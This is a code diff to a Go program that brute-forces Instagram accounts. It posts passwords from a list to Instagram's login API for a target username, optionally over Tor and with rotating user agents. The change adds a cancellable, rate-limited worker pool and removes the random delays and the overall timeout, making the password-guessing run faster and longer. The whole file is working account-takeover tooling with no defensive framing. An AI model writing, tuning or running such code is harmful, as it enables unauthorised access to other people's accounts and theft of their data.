@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -22,6 +23,8 @@ const (
 	API_URL      = "https://i.instagram.com/api/v1/"
 	TIMEOUT      = 10 * time.Second
 	CURRENT_USER = "monsmain"
+	RATE_LIMIT   = time.Second // 1 request per second per worker
+	WORKER_COUNT = 2           // can be configurable
 )
 
 var userAgents = []string{
@@ -113,37 +116,64 @@ func main() {
 	fmt.Println("\nStarting login attempts...\n")
 	found := make(chan LoginResult, 1)
 	progress := make(chan int, len(passwords))
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
 	var wg sync.WaitGroup
 
-	workerCount := 2
 	jobs := make(chan string, len(passwords))
-	for i := 0; i < workerCount; i++ {
+
+	// Rate-limited worker pool
+	for i := 0; i < WORKER_COUNT; i++ {
 		wg.Add(1)
-		go func() {
+		go func(workerId int) {
 			defer wg.Done()
-			for password := range jobs {
-				res := tryLogin(username, password, useTor)
-				progress <- 1
-				if res.Success {
-					select {
-					case found <- res:
-					default:
-					}
+			ticker := time.NewTicker(RATE_LIMIT)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-ctx.Done():
 					return
+				case password, ok := <-jobs:
+					if !ok {
+						return
+					}
+					<-ticker.C
+					res := tryLogin(ctx, username, password, useTor)
+					progress <- 1
+					if res.Success {
+						select {
+						case found <- res:
+						default:
+						}
+						cancel() // cancel context for all workers
+						return
+					}
 				}
-				time.Sleep(randomDuration(5, 10))
 			}
-		}()
+		}(i)
 	}
 
 	go func() {
 		for _, password := range passwords {
-			jobs <- password
+			select {
+			case <-ctx.Done():
+				break
+			default:
+				jobs <- password
+			}
 		}
 		close(jobs)
 	}()
 
 	go showProgressBar(len(passwords), progress)
+
+	done := make(chan struct{})
+	go func() {
+		wg.Wait()
+		close(done)
+	}()
 
 	select {
 	case res := <-found:
@@ -151,8 +181,8 @@ func main() {
 		fmt.Printf("Username: %s\n", username)
 		fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
 		saveResultJSON(res)
-	case <-waitGroupTimeout(&wg, 60*time.Minute):
-		fmt.Println("\n❌ No valid password found in the given time.")
+	case <-done:
+		fmt.Println("\n❌ No valid password found in the given list.")
 		saveResultJSON(LoginResult{
 			Username: username,
 			Password: "",
@@ -216,24 +246,7 @@ func showProgressBar(total int, progress <-chan int) {
 	}
 }
 
-func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{} {
-	done := make(chan struct{})
-	go func() {
-		c := make(chan struct{})
-		go func() {
-			wg.Wait()
-			close(c)
-		}()
-		select {
-		case <-c:
-		case <-time.After(timeout):
-		}
-		close(done)
-	}()
-	return done
-}
-
-func tryLogin(username, password string, useTor bool) LoginResult {
+func tryLogin(ctx context.Context, username, password string, useTor bool) LoginResult {
 	loginUrl := API_URL + "accounts/login/"
 	data := url.Values{}
 	data.Set("username", username)
@@ -253,7 +266,7 @@ func tryLogin(username, password string, useTor bool) LoginResult {
 		client = &http.Client{Timeout: TIMEOUT}
 	}
 
-	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
+	req, err := http.NewRequestWithContext(ctx, "POST", loginUrl, strings.NewReader(data.Encode()))
 	if err != nil {
 		log.Printf("Error creating request: %v\n", err)
 		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Request error"}
@@ -362,8 +375,4 @@ func printProgress(current, total int) {
 	if current == total {
 		os.Stdout.WriteString("\n")
 	}
-}
-
-func randomDuration(min, max int) time.Duration {
-	return time.Duration(rand.Intn(max-min+1)+min) * time.Second
 }
